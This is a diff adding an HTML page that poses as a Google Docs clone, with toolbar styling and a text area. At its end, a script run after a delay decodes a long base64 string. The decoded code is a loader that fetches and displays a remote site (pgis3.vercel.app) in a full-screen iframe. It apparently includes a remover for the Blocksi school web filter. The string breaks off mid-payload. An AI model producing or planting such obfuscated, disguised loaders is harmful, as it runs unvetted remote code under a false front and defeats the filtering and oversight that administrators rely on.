@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <base href="https://google-docs-clone-123.vercel.app/"></base>
+    <title>Google Docs</title>
+    <style>
+        :root {
+    --hrlinecolr: #707070;
+    --mainbg: #fbfbfbfd;
+    --pagebg:#ffffff;
+}
+
+* {
+    padding: 0;
+    margin: 0;
+}
+
+.flex {
+    display: flex;
+}
+
+.gap {
+    gap: 1rem;
+}
+
+li {
+    list-style: none;
+}
+
+
+.header {
+    padding: 1rem;
+}
+
+.nav-bar {
+    align-items: center;
+}
+
+.star {
+    font-size: 20px;
+}
+
+.left-list {
+    padding-left: 0.5rem;
+}
+
+
+.right-list {
+    display: flex;
+    align-items: center;
+    align-self: center;
+    margin-left: auto;
+    gap: 1.5rem;
+}
+
+.img-head {
+    width: 30px;
+    height: 30px;
+}
+
+.menu-head {
+    padding: 10px 0;
+}
+
+.menu {
+
+    padding-left: 15px;
+    /* width: 1380px; */
+    width: calc(96% - 30px);
+    height: 35px;
+    background: #f3f6fc;
+    border-radius: 25px;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+.fullhrline {
+    margin-top: 15px;
+    align-items: center;
+    /* width: 1395px; */
+    width: calc(96% - 15px);
+    height: 0px;
+    border: 1px groove var(--hrlinecolr);
+
+}
+
+.menu-left {
+    align-items: center;
+}
+
+.undo-print {
+    align-items: center;
+}
+
+.undo-redo {
+    font-size: 20px;
+}
+
+.menu-img {
+    width: 18px;
+    height: 18px;
+}
+
+#zoom,
+#txtStyle,
+#Font {
+    height: 18px;
+    border: none;
+    background: none;
+}
+
+.hrline {
+    align-items: center;
+    width: 18px;
+    height: 0px;
+    border: 1px groove var(--hrlinecolr);
+    transform: rotate(90deg);
+}
+
+.fontsize button {
+    font-size: 18px;
+    padding: 0 5px;
+}
+
+#value {
+    /* border: 1px solid black; */
+    border-radius: 5px;
+    text-align: center;
+}
+
+.fontsize button {
+    background: none;
+    border: none;
+}
+
+.bold {
+    font-weight: bold;
+}
+
+.underline {
+    text-decoration: underline;
+}
+
+.txtcolor {
+    text-decoration: underline;
+    text-underline-offset: 4px;
+    text-decoration-thickness: 3px;
+}
+
+.link-add-img {
+    align-items: center;
+}
+
+.link-img {
+    width: 22px;
+    height: 22px;
+}
+
+.addcom-img {
+    width: 18px;
+    height: 18px;
+}
+
+.addimg-img {
+    text-align: center;
+    width: 16px;
+    height: 15px;
+}
+
+.align-line-list,
+.align {
+    align-items: center;
+}
+
+.align-line-list img {
+    width: 18px;
+    height: 18px;
+}
+
+.menu-right {
+    float: right;
+    margin-left: auto;
+}
+
+.editing-img {
+    width: 16px;
+    height: 16px;
+    padding-right: 10px;
+}
+
+.selectBtn {
+    padding-right: 15px;
+}
+
+.selectBtn select {
+    border: none;
+    background: none;
+}
+
+.menu-rightside {
+    gap: 2rem;
+    position: relative;
+    top: -40px;
+    flex-direction: column;
+    float: right;
+}
+
+.menu-rightside img {
+    width: 20px;
+    height: 20px;
+}
+
+.main-section {
+    width: 100%;
+    height: 1000px;
+    background-color: var(--mainbg);
+}
+
+.page {
+    position: relative;
+    top: 50px;
+    margin: auto;
+    width: calc(100% - 40%);
+    height: 900px;
+    background: var(--pagebg);
+    box-shadow: 0 0 5px grey;
+}
+#txt{
+    width: calc(100% - 7%);
+    font-size: 20px;
+    padding: 30px;
+    height: 840px;
+    border: none;
+}
+    </style>
+    <script defer src="/index.js"></script>
+</head>
+
+<body>
+    <header class="header">
+        <div class="nav-bar flex">
+            <div class="logo">
+                <img src="/img/logo.png" alt="logo">
+            </div>
+            <div class="left-list">
+                <div class="untitled">
+                    <div class="untitled-star gap flex">
+                        <h2>Untitled document</h2>
+                        <p class="star">&#9734;</p>
+                    </div>
+                    <ul class="flex gap ul-list">
+                        <li class="list-items">File</li>
+                        <li class="list-items">Edit</li>
+                        <li class="list-items">View</li>
+                        <li class="list-items">Insert</li>
+                        <li class="list-items">Format</li>
+                        <li class="list-items">Tools</li>
+                        <li class="list-items">Extensions</li>
+                        <li class="list-items">Help</li>
+                    </ul>
+                </div>
+
+            </div>
+            <div class="right-list">
+                <img class="img-head" src="/img/comment.png" alt="comment">
+                <img class="img-head" src="/img/meet.png" alt="meet">
+                <img class="img-head" src="/img/lock.png" alt="Share">
+                <img class="img-head" src="/img/profile.png" alt="profile">
+
+            </div>
+        </div>
+        <div class="menu-head">
+            <div class="menu flex">
+                <div class="menu-left flex">
+                    <div class="undo-print flex gap">
+                        <p class="undo-redo">&#8630;</p>
+                        <p class="undo-redo">&#8631;</p>
+                        <img class="menu-img" src="/img/printer.png" alt="printer">
+                        <p>A</p>
+                        <img class="menu-img" src="/img/rollerBrush.png" alt="rollerBrush">
+                        <select name="Zoom" id="zoom">
+                            <option value="50%">50%</option>
+                            <option value="75%">75%</option>
+                            <option value="90%">90%</option>
+                            <option value="100%" selected>100%</option>
+                            <option value="125%">125%</option>
+                            <option value="150%">150%</option>
+                            <option value="200%">200%</option>
+                        </select>
+                    </div>
+                    <div class="hrline"></div>
+                    <div class="txt-style">
+                        <select name="style" id="txtStyle">
+                            <option value="Normal text">Normal text</option>
+                            <option value="Title">Title</option>
+                            <option value="Subtitle">Subtitle</option>
+                            <option value="Heading 1">Heading 1</option>
+                            <option value="Heading 2">Heading 2</option>
+                            <option value="Heading 3">Heading 3</option>
+                            <option value="Options">Options</option>
+                        </select>
+                    </div>
+                    <div class="hrline"></div>
+                    <div class="fontfamily">
+                        <select name="Font" id="Font">
+                            <option value="Arial">Arial</option>
+                            <option value="Caveat">Caveat
+                            </option>
+                            <option value="Impact">Impact</option>
+                            <option value="Lexend">Lexend</option>
+                        </select>
+                    </div>
+                    <div class="hrline"></div>
+                    <div class="fontsize">
+                        <button id="decreaseBtn">-</button>
+                        <span id="value">10</span>
+                        <!-- <input id="value" class="fsizeinput" type="text" value="10"> -->
+                        <button id="increaseBtn">+</button>
+                    </div>
+                    <div class="hrline"></div>
+                    <div class="fonttype flex gap">
+                        <p class="bold">B</p>
+                        <p class="italic bold"><i>I</i></p>
+                        <p class="underline bold">U</p>
+                        <p class="txtcolor bold">A</p>
+                        <img class="highlight" src="/img/pencil.png" alt="highlight color">
+                    </div>
+                    <div class="hrline"></div>
+                    <div class="link-add-img flex gap">
+                        <img class="link-img" src="/img/link.png" alt="" srcset="">
+                        <img class="addcom-img" src="/img/Addcomment.png" alt="add comment" srcset="">
+                        <img class="addimg-img" src="/img/image.png" alt="add image" srcset="">
+                    </div>
+                    <div class="hrline"></div>
+                    <div class="align-line-list flex gap">
+                        <div class="align flex">
+                            <img src="/img/alignR.png" alt="Align">
+
+                        </div>
+                        <img src="/img/line.png" alt="line">
+                        <img src="/img/check-list.png" alt="Check List">
+                        <img src="/img/bulletList.png" alt="Bullet List">
+                        <img src="/img/numbreList.png" alt="Numbered List">
+                        <img src="/img/indentDe.png" alt="Decrease Indent">
+                        <img src="/img/indentInc.png" alt="Increase Indent">
+                        <img src="/img/clearFormate.png" alt="Clear Formatting">
+                    </div>  
+                </div>
+                <div class="menu-right">
+                    <div class="editing flex">
+                        <img class="editing-img" src="/img/EditingMode.png" alt="Editing Mode">
+                        <p>Editing</p>
+                    </div>
+                </div>
+                <div class="hrline"></div>
+                <div class="selectBtn">
+                    <select name="hide" id="hide"></select>
+                </div>
+            </div>
+            <div class="fullhrline"></div>
+            <div class="menu-rightside flex">
+                <img src="/img/calendar.png" alt="calendar">
+                <img src="/img/keep.png" alt="keep">
+                <img src="/img/user.png" alt="user">
+                <img src="/img/map.png" alt="map">
+            </div>
+        </div>
+    </header>
+
+    <main class="main-section">
+        <div class="page">
+            <textarea name="txt" id="txt" cols="30" rows="10"></textarea>
+        </div>
+    </main>
+  <script>
+setTimeout(function(){
+  var b="PCFkb2N0eXBlIGh0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgY2hhcnNldD0iVVRGLTgiPgo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSI+Cjx0aXRsZT5QR0lTPC90aXRsZT4KCjxzdHlsZT4KaHRtbCxib2R5IHsKICAgIG1hcmdpbjowOwogICAgd2lkdGg6MTAwJTsKICAgIGhlaWdodDoxMDAlOwogICAgb3ZlcmZsb3c6aGlkZGVuOwogICAgYmFja2dyb3VuZDojMDAwOwp9CgojcGdpcyB7CiAgICBwb3NpdGlvbjpmaXhlZDsKICAgIGluc2V0OjA7CiAgICB3aWR0aDoxMDAlOwogICAgaGVpZ2h0OjEwMCU7CiAgICBib3JkZXI6MDsKfQoKI3N0YXR1cyB7CiAgICBwb3NpdGlvbjpmaXhlZDsKICAgIGluc2V0OjA7CiAgICBib3gtc2l6aW5nOmJvcmRlci1ib3g7CiAgICBwYWRkaW5nOjI1cHg7CiAgICBvdmVyZmxvdzphdXRvOwogICAgYmFja2dyb3VuZDojMDkwOTA5OwogICAgY29sb3I6I2ZmZjsKICAgIGZvbnQtZmFtaWx5OkFyaWFsLHNhbnMtc2VyaWY7Cn0KCiNzdGF0dXMgaDEgewogICAgZm9udC1zaXplOjIycHg7CiAgICBtYXJnaW46MCAwIDIwcHg7Cn0KCi5ib3ggewogICAgYmFja2dyb3VuZDojMTExOwogICAgYm9yZGVyOjFweCBzb2xpZCAjMjkyOTI5OwogICAgYm9yZGVyLXJhZGl1czo4cHg7CiAgICBwYWRkaW5nOjE0cHg7CiAgICBtYXJnaW46MTBweCAwOwp9CgoubGFiZWwgewogICAgY29sb3I6Izg4ODsKICAgIGZvbnQtc2l6ZToxMXB4OwogICAgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOwogICAgbWFyZ2luLWJvdHRvbTo2cHg7Cn0KCi52YWx1ZSB7CiAgICBmb250LWZhbWlseTptb25vc3BhY2U7CiAgICBmb250LXNpemU6MTNweDsKICAgIGxpbmUtaGVpZ2h0OjEuNTsKICAgIHdoaXRlLXNwYWNlOnByZS13cmFwOwogICAgd29yZC1icmVhazpicmVhay13b3JkOwp9CgouZXJyb3IgewogICAgY29sb3I6I2ZmNjY2NjsKfQo8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keT4KCjxkaXYgaWQ9InN0YXR1cyI+CiAgICA8aDE+U3RhcnRpbmcgUEdJUyBsb2FkZXIuLi48L2gxPgoKICAgIDxkaXYgY2xhc3M9ImJveCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibGFiZWwiPlN0YXR1czwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InZhbHVlIiBpZD0ic3RhdHVzVGV4dCI+CiAgICAgICAgICAgIEluaXRpYWxpemluZy4uLgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvZGl2PgoKPGlmcmFtZQogICAgaWQ9InBnaXMiCiAgICBhbGxvdz0iZnVsbHNjcmVlbiIKICAgIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8L2lmcmFtZT4KCjxzY3JpcHQ+CihmdW5jdGlvbiAoKSB7CgogICAgdmFyIFBHSVMgPSAiaHR0cHM6Ly9wZ2lzMy52ZXJjZWwuYXBwLyI7CiAgICB2YXIgc3RhdHVzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInN0YXR1cyIpOwogICAgdmFyIHN0YXR1c1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic3RhdHVzVGV4dCIpOwogICAgdmFyIGlmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwZ2lzIik7CgogICAgZnVuY3Rpb24gdGV4dCh2YWx1ZSkgewogICAgICAgIHJldHVybiBTdHJpbmcodmFsdWUgPT0gbnVsbCA/ICIiIDogdmFsdWUpOwogICAgfQoKICAgIGZ1bmN0aW9uIGVzY2FwZSh2YWx1ZSkgewogICAgICAgIHJldHVybiB0ZXh0KHZhbHVlKQogICAgICAgICAgICAucmVwbGFjZSgvJi9nLCAiJmFtcDsiKQogICAgICAgICAgICAucmVwbGFjZSgvPC9nLCAiJmx0OyIpCiAgICAgICAgICAgIC5yZXBsYWNlKC8+L2csICImZ3Q7IikKICAgICAgICAgICAgLnJlcGxhY2UoLyIvZywgIiZxdW90OyIpCiAgICAgICAgICAgIC5yZXBsYWNlKC8nL2csICImIzAzOTsiKTsKICAgIH0KCiAgICBmdW5jdGlvbiBzZXRTdGF0dXMobWVzc2FnZSkgewogICAgICAgIHN0YXR1c1RleHQudGV4dENvbnRlbnQgPSBtZXNzYWdlOwogICAgfQoKICAgIGZ1bmN0aW9uIGZhaWwodGl0bGUsIGVycm9yLCB1cmwsIGV4dHJhKSB7CgogICAgICAgIHZhciBtZXNzYWdlID0KICAgICAgICAgICAgZXJyb3IgJiYgZXJyb3IubWVzc2FnZQogICAgICAgICAgICAgICAgPyBlcnJvci5tZXNzYWdlCiAgICAgICAgICAgICAgICA6IHRleHQoZXJyb3IpOwoKICAgICAgICB2YXIgbmFtZSA9CiAgICAgICAgICAgIGVycm9yICYmIGVycm9yLm5hbWUKICAgICAgICAgICAgICAgID8gZXJyb3IubmFtZQogICAgICAgICAgICAgICAgOiAiVW5rbm93biI7CgogICAgICAgIHN0YXR1cy5pbm5lckhUTUwgPQogICAgICAgICAgICAnPGgxPicgKyBlc2NhcGUodGl0bGUpICsgJzwvaDE+JyArCgogICAgICAgICAgICAnPGRpdiBjbGFzcz0iYm94Ij4nICsKICAgICAgICAgICAgICAgICc8ZGl2IGNsYXNzPSJsYWJlbCI+RXJyb3I8L2Rpdj4nICsKICAgICAgICAgICAgICAgICc8ZGl2IGNsYXNzPSJ2YWx1ZSBlcnJvciI+JyArCiAgICAgICAgICAgICAgICAgICAgZXNjYXBlKG1lc3NhZ2UpICsKICAgICAgICAgICAgICAgICc8L2Rpdj4nICsKICAgICAgICAgICAgJzwvZGl2PicgKwoKICAgICAgICAgICAgJzxkaXYgY2xhc3M9ImJveCI+JyArCiAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0ibGFiZWwiPkVycm9yIG5hbWU8L2Rpdj4nICsKICAgICAgICAgICAgICAgICc8ZGl2IGNsYXNzPSJ2YWx1ZSI+JyArCiAgICAgICAgICAgICAgICAgICAgZXNjYXBlKG5hbWUpICsKICAgICAgICAgICAgICAgICc8L2Rpdj4nICsKICAgICAgICAgICAgJzwvZGl2PicgKwoKICAgICAgICAgICAgJzxkaXYgY2xhc3M9ImJveCI+JyArCiAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0ibGFiZWwiPlVSTDwvZGl2PicgKwogICAgICAgICAgICAgICAgJzxkaXYgY2xhc3M9InZhbHVlIj4nICsKICAgICAgICAgICAgICAgICAgICBlc2NhcGUodXJsIHx8ICJOb25lIikgKwogICAgICAgICAgICAgICAgJzwvZGl2PicgKwogICAgICAgICAgICAnPC9kaXY+JyArCgogICAgICAgICAgICAnPGRpdiBjbGFzcz0iYm94Ij4nICsKICAgICAgICAgICAgICAgICc8ZGl2IGNsYXNzPSJsYWJlbCI+RGV0YWlsczwvZGl2PicgKwogICAgICAgICAgICAgICAgJzxkaXYgY2xhc3M9InZhbHVlIj4nICsKICAgICAgICAgICAgICAgICAgICBlc2NhcGUoZXh0cmEgfHwgIk5vbmUiKSArCiAgICAgICAgICAgICAgICAnPC9kaXY+JyArCiAgICAgICAgICAgICc8L2Rpdj4nICsKCiAgICAgICAgICAgICc8ZGl2IGNsYXNzPSJib3giPicgKwogICAgICAgICAgICAgICAgJzxkaXYgY2xhc3M9ImxhYmVsIj5Mb2FkZXIgb3JpZ2luPC9kaXY+JyArCiAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0idmFsdWUiPicgKwogICAgICAgICAgICAgICAgICAgIGVzY2FwZShsb2NhdGlvbi5vcmlnaW4pICsKICAgICAgICAgICAgICAgICc8L2Rpdj4nICsKICAgICAgICAgICAgJzwvZGl2PicgKwoKICAgICAgICAgICAgJzxkaXYgY2xhc3M9ImJveCI+JyArCiAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0ibGFiZWwiPlBHSVMgb3JpZ2luPC9kaXY+JyArCiAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0idmFsdWUiPicgKwogICAgICAgICAgICAgICAgICAgIGVzY2FwZShuZXcgVVJMKFBHSVMpLm9yaWdpbikgKwogICAgICAgICAgICAgICAgJzwvZGl2PicgKwogICAgICAgICAgICAnPC9kaXY+JzsKICAgIH0KCiAgICB3aW5kb3cub25lcnJvciA9IGZ1bmN0aW9uICgKICAgICAgICBtZXNzYWdlLAogICAgICAgIHNvdXJjZSwKICAgICAgICBsaW5lLAogICAgICAgIGNvbHVtbiwKICAgICAgICBlcnJvcgogICAgKSB7CgogICAgICAgIGZhaWwoCiAgICAgICAgICAgICJMb2FkZXIgSmF2YVNjcmlwdCBlcnJvciIsCiAgICAgICAgICAgIGVycm9yIHx8IHsKICAgICAgICAgICAgICAgIG5hbWU6ICJKYXZhU2NyaXB0RXJyb3IiLAogICAgICAgICAgICAgICAgbWVzc2FnZTogbWVzc2FnZQogICAgICAgICAgICB9LAogICAgICAgICAgICBzb3VyY2UsCiAgICAgICAgICAgICJMaW5lOiAiICsgbGluZSArCiAgICAgICAgICAgICJcXG5Db2x1bW46ICIgKyBjb2x1bW4KICAgICAgICApOwoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9OwoKICAgIHdpbmRvdy5vbnVuaGFuZGxlZHJlamVjdGlvbiA9IGZ1bmN0aW9uIChldmVudCkgewoKICAgICAgICB2YXIgcmVhc29uID0gZXZlbnQucmVhc29uOwoKICAgICAgICBmYWlsKAogICAgICAgICAgICAiVW5oYW5kbGVkIGxvYWRlciBlcnJvciIsCiAgICAgICAgICAgIHJlYXNvbiB8fCB7CiAgICAgICAgICAgICAgICBuYW1lOiAiVW5oYW5kbGVkUmVqZWN0aW9uIiwKICAgICAgICAgICAgICAgIG1lc3NhZ2U6ICJVbmtub3duIHJlamVjdGlvbiIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgIiIsCiAgICAgICAgICAgICJBIFByb21pc2UgcmVqZWN0ZWQgd2l0aG91dCBiZWluZyBoYW5kbGVkLiIKICAgICAgICApOwogICAgfTsKCiAgICBhc3luYyBmdW5jdGlvbiBmZXRjaFBHSVModXJsKSB7CgogICAgICAgIHNldFN0YXR1cygKICAgICAgICAgICAgIkZldGNoaW5nOlxcbiIgKyB1cmwKICAgICAgICApOwoKICAgICAgICB2YXIgcmVzcG9uc2U7CgogICAgICAgIHRyeSB7CgogICAgICAgICAgICByZXNwb25zZSA9IGF3YWl0IGZldGNoKAogICAgICAgICAgICAgICAgdXJsLAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGNhY2hlOiAibm8tc3RvcmUiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICk7CgogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CgogICAgICAgICAgICBmYWlsKAogICAgICAgICAgICAgICAgIkNvdWxkIG5vdCBmZXRjaCBQR0lTIiwKICAgICAgICAgICAgICAgIGVycm9yLAogICAgICAgICAgICAgICAgdXJsLAogICAgICAgICAgICAgICAgIlRoZSBicm93c2VyIHJlY2VpdmVkIG5vIHJlYWRhYmxlIEhUVFAgcmVzcG9uc2UuICIgKwogICAgICAgICAgICAgICAgIklmIHBnaXMzLnZlcmNlbC5hcHAgd29ya3Mgbm9ybWFsbHkgaW4gYSBicm93c2VyLCAiICsKICAgICAgICAgICAgICAgICJjaGVjayB0aGUgQ09SUyBoZWFkZXJzIG9uIHRoZSBQR0lTIGRlcGxveW1lbnQuIgogICAgICAgICAgICApOwoKICAgICAgICAgICAgdGhyb3cgZXJyb3I7CiAgICAgICAgfQoKICAgICAgICB2YXIgY29udGVudFR5cGUgPQogICAgICAgICAgICByZXNwb25zZS5oZWFkZXJzLmdldCgiY29udGVudC10eXBlIikgfHwKICAgICAgICAgICAgIk5vIENvbnRlbnQtVHlwZSBoZWFkZXIiOwoKICAgICAgICBpZiAoIXJlc3BvbnNlLm9rKSB7CgogICAgICAgICAgICB2YXIgaHR0cEVycm9yID0KICAgICAgICAgICAgICAgIG5ldyBFcnJvcigKICAgICAgICAgICAgICAgICAgICAiSFRUUCAiICsKICAgICAgICAgICAgICAgICAgICByZXNwb25zZS5zdGF0dXMgKwogICAgICAgICAgICAgICAgICAgICIgIiArCiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2Uuc3RhdHVzVGV4dAogICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIGh0dHBFcnJvci5uYW1lID0gIkhUVFBFcnJvciI7CgogICAgICAgICAgICBmYWlsKAogICAgICAgICAgICAgICAgIlBHSVMgcmV0dXJuZWQgYW4gSFRUUCBlcnJvciIsCiAgICAgICAgICAgICAgICBodHRwRXJyb3IsCiAgICAgICAgICAgICAgICB1cmwsCiAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlOiAiICsgY29udGVudFR5cGUKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIHRocm93IGh0dHBFcnJvcjsKICAgICAgICB9CgogICAgICAgIHNldFN0YXR1cygKICAgICAgICAgICAgIkZldGNoZWQgc3VjY2Vzc2Z1bGx5OlxcbiIgKwogICAgICAgICAgICB1cmwgKwogICAgICAgICAgICAiXFxuXFxuSFRUUDogIiArCiAgICAgICAgICAgIHJlc3BvbnNlLnN0YXR1cyArCiAgICAgICAgICAgICJcXG5Db250ZW50LVR5cGU6ICIgKwogICAgICAgICAgICBjb250ZW50VHlwZQogICAgICAgICk7CgogICAgICAgIHJldHVybiBhd2FpdCByZXNwb25zZS50ZXh0KCk7CiAgICB9CgogICAgZnVuY3Rpb24gZml4VVJMKHZhbHVlLCBiYXNlKSB7CgogICAgICAgIGlmICghdmFsdWUpIHsKICAgICAgICAgICAgcmV0dXJuIHZhbHVlOwogICAgICAgIH0KCiAgICAgICAgdmFsdWUgPSB2YWx1ZS50cmltKCk7CgogICAgICAgIGlmICgKICAgICAgICAgICAgdmFsdWUuaW5kZXhPZigiZGF0YToiKSA9PT0gMCB8fAogICAgICAgICAgICB2YWx1ZS5pbmRleE9mKCJibG9iOiIpID09PSAwIHx8CiAgICAgICAgICAgIHZhbHVlLmluZGV4T2YoImphdmFzY3JpcHQ6IikgPT09IDAgfHwKICAgICAgICAgICAgdmFsdWUuaW5kZXhPZigibWFpbHRvOiIpID09PSAwIHx8CiAgICAgICAgICAgIHZhbHVlLmluZGV4T2YoInRlbDoiKSA9PT0gMCB8fAogICAgICAgICAgICB2YWx1ZS5pbmRleE9mKCIjIikgPT09IDAKICAgICAgICApIHsKICAgICAgICAgICAgcmV0dXJuIHZhbHVlOwogICAgICAgIH0KCiAgICAgICAgLyoKICAgICAgICAgKiBQR0lTIHZlcnNpb24gaW5mb3JtYXRpb24gYWx3YXlzIGxpdmVzCiAgICAgICAgICogYXQgdGhlIHJvb3Qgb2YgdGhlIFBHSVMgZGVwbG95bWVudC4KICAgICAgICAgKi8KICAgICAgICBpZiAoCiAgICAgICAgICAgIHZhbHVlID09PSAidmVyc2lvbi5qc29uIiB8fAogICAgICAgICAgICB2YWx1ZSA9PT0gIi4vdmVyc2lvbi5qc29uIiB8fAogICAgICAgICAgICAvXC92ZXJzaW9uXC5qc29uKD86Wz8jXXwkKS9pLnRlc3QodmFsdWUpCiAgICAgICAgKSB7CiAgICAgICAgICAgIHJldHVybiBQR0lTICsgInZlcnNpb24uanNvbiI7CiAgICAgICAgfQoKICAgICAgICB0cnkgewoKICAgICAgICAgICAgaWYgKHZhbHVlLmNoYXJBdCgwKSA9PT0gIi8iKSB7CgogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBVUkwoCiAgICAgICAgICAgICAgICAgICAgdmFsdWUuc3Vic3RyaW5nKDEpLAogICAgICAgICAgICAgICAgICAgIFBHSVMKICAgICAgICAgICAgICAgICkuaHJlZjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIG5ldyBVUkwoCiAgICAgICAgICAgICAgICB2YWx1ZSwKICAgICAgICAgICAgICAgIGJhc2UKICAgICAgICAgICAgKS5ocmVmOwoKICAgICAgICB9IGNhdGNoIChlcnJvcikgewoKICAgICAgICAgICAgcmV0dXJuIHZhbHVlOwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBwcmVwYXJlSFRNTCh1cmwsIGh0bWwpIHsKCiAgICAgICAgdmFyIGRvYyA9CiAgICAgICAgICAgIG5ldyBET01QYXJzZXIoKS5wYXJzZUZyb21TdHJpbmcoCiAgICAgICAgICAgICAgICBodG1sLAogICAgICAgICAgICAgICAgInRleHQvaHRtbCIKICAgICAgICAgICAgKTsKCiAgICAgICAgdmFyIGRpcmVjdG9yeSA9CiAgICAgICAgICAgIHVybC5zdWJzdHJpbmcoCiAgICAgICAgICAgICAgICAwLAogICAgICAgICAgICAgICAgdXJsLmxhc3RJbmRleE9mKCIvIikgKyAxCiAgICAgICAgICAgICk7CgogICAgICAgIC8qCiAgICAgICAgICogTWFrZSByZWxhdGl2ZSByZXNvdXJjZXMgcmVzb2x2ZSBmcm9tCiAgICAgICAgICogdGhlIGFjdHVhbCBQR0lTIGZpbGUncyBkaXJlY3RvcnkuCiAgICAgICAgICovCiAgICAgICAgdmFyIGJhc2UgPQogICAgICAgICAgICBkb2MuY3JlYXRlRWxlbWVudCgiYmFzZSIpOwoKICAgICAgICBiYXNlLmhyZWYgPSBkaXJlY3Rvcnk7CgogICAgICAgIGRvYy5oZWFkLmluc2VydEJlZm9yZSgKICAgICAgICAgICAgYmFzZSwKICAgICAgICAgICAgZG9jLmhlYWQuZmlyc3RDaGlsZAogICAgICAgICk7CgogICAgICAgIC8qCiAgICAgICAgICogRml4IHJvb3QtcmVsYXRpdmUgcmVzb3VyY2VzIHN1Y2ggYXM6CiAgICAgICAgICoKICAgICAgICAgKiAvYXNzZXRzL2Zvby5wbmcKICAgICAgICAgKiAvYXBwLmpzCiAgICAgICAgICogL2Jsb2Nrc2lfcmVtb3Zlci5qcwogICAgICAgICAqIC9wYWdlcy9pbmZvLmh0bWwKICAgICAgICAgKi8KICAgICAgICB2YXIgZWxlbWVudHMgPQogICAgICAgICAgICBkb2MucXVlcnlTZWxlY3RvckFsbCgKICAgICAgICAgICAgICAgICJbc3JjXSxbaHJlZl0sW2FjdGlvbl0iCiAgICAgICAgICAgICk7CgogICAgICAgIGZvciAoCiAgICAgICAgICAgIHZhciBpID0gMDsKICAgICAgICAgICAgaSA8IGVsZW1lbnRzLmxlbmd0aDsKICAgICAgICAgICAgaSsrCiAgICAgICAgKSB7CgogICAgICAgICAgICB2YXIgZWxlbWVudCA9IGVsZW1lbnRzW2ldOwoKICAgICAgICAgICAgdmFyIGF0dHJpYnV0ZSA9CiAgICAgICAgICAgICAgICBlbGVtZW50Lmhhc0F0dHJpYnV0ZSgic3JjIikKICAgICAgICAgICAgICAgICAgICA/ICJzcmMiCiAgICAgICAgICAgICAgICAgICAgOiBlbGVtZW50Lmhhc0F0dHJpYnV0ZSgiaHJlZiIpCiAgICAgICAgICAgICAgICAgICAgICAgID8gImhyZWYiCiAgICAgICAgICAgICAgICAgICAgICAgIDogImFjdGlvbiI7CgogICAgICAgICAgICB2YXIgdmFsdWUgPQogICAgICAgICAgICAgICAgZWxlbWVudC5nZXRBdHRyaWJ1dGUoCiAgICAgICAgICAgICAgICAgICAgYXR0cmlidXRlCiAgICAgICAgICAgICAgICApOwoKICAgICAgICAgICAgaWYgKCF2YWx1ZSkgewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8qCiAgICAgICAgICAgICAqIEhUTUwgaWZyYW1lIHBhZ2VzIGFyZSBoYW5kbGVkCiAgICAgICAgICAgICAqIHNlcGFyYXRlbHkgYmVsb3cuCiAgICAgICAgICAgICAqLwogICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICBlbGVtZW50LnRhZ05hbWUgPT09ICJJRlJBTUUiICYmCiAgICAgICAgICAgICAgICAvXC5odG1sKD86Wz8jXXwkKS9pLnRlc3QodmFsdWUpCiAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGVsZW1lbnQuc2V0QXR0cmlidXRlKAogICAgICAgICAgICAgICAgYXR0cmlidXRlLAogICAgICAgICAgICAgICAgZml4VVJMKAogICAgICAgICAgICAgICAgICAgIHZhbHVlLAogICAgICAgICAgICAgICAgICAgIGRpcmVjdG9yeQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICApOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICgKICAgICAgICAgICAgIjwhZG9jdHlwZSBodG1sPiIgKwogICAgICAgICAgICBkb2MuZG9jdW1lbnRFbGVtZW50Lm91dGVySFRNTAogICAgICAgICk7CiAgICB9CgogICAgYXN5bmMgZnVuY3Rpb24gbG9hZE1haW4oKSB7CgogICAgICAgIHZhciB1cmwgPQogICAgICAgICAgICBQR0lTICsgImluZGV4Lmh0bWwiOwoKICAgICAgICBzZXRTdGF0dXMoCiAgICAgICAgICAgICJUZXN0aW5nIGRpcmVjdCBQR0lTIGNvbm5lY3Rpb24uLi4iCiAgICAgICAgKTsKCiAgICAgICAgdmFyIGh0bWwgPQogICAgICAgICAgICBhd2FpdCBmZXRjaFBHSVModXJsKTsKCiAgICAgICAgc2V0U3RhdHVzKAogICAgICAgICAgICAiUHJlcGFyaW5nIFBHSVMgSFRNTC4uLiIKICAgICAgICApOwoKICAgICAgICBpZnJhbWU